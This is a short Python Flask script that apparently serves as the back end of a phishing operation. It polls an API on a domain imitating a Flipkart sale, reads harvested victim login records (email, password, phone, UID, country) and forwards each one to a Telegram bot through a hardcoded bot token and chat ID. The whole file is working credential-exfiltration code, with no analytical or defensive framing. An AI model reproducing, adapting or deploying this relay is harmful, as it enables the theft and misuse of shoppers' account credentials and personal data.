from flask import Flask, jsonify
import requests
import json

app = Flask(__name__)

BOT_TOKEN = "7987963743:AAHGeeneGd2xm2EJou1U4hDUaqNN9kh-Zoc"
CHAT_ID = "7924753922"
API_URL = "https://flipkart-indian-sale-live.free.je/api.php"

@app.route('/')
def home():
    try:
        # API hit karo
        r = requests.get(API_URL)
        if r.status_code == 200:
            res = r.json()
            if res.get('status') == 'success':
                data = res.get('data')
                if data:
                    msg = f"🚨 New Login Data!\n"
                    msg += f"UID: {data.get('uid', 'N/A')}\n"
                    msg += f"Email: {data.get('email', 'N/A')}\n"
                    msg += f"Password: {data.get('password', 'N/A')}\n"
                    msg += f"Platform: {data.get('platform', 'N/A')}\n"
                    msg += f"Level: {data.get('level', 'N/A')}\n"
                    msg += f"Phone: {data.get('phone', 'N/A')}\n"
                    msg += f"Country: {data.get('country', 'N/A')}\n"
                    
                    # Telegram bhejo
                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                    requests.post(url, data={"chat_id": CHAT_ID, "text": msg})
                    return jsonify({"status": "sent"})
    except:
        pass
    return jsonify({"status": "no new data"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)